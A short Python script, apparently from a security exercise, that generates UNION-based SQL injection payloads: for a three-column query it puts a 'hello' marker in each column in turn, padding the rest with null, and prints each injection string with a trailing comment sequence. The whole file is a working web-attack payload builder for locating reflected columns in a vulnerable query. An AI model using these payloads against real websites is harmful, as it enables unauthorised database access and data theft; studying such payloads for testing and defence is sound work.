
num_cols = 3
for i in range(1,num_cols+1):
    string = "'hello'"
    payload_list = ['null'] * num_cols
    print(payload_list)
    payload_list[i-1] = string
    print(payload_list)
    sql_payload = "' Union select "+ ','.join(payload_list) + "--"
    print(sql_payload)
    print("------------------")


res = "'hello'"
print(res.strip('\''))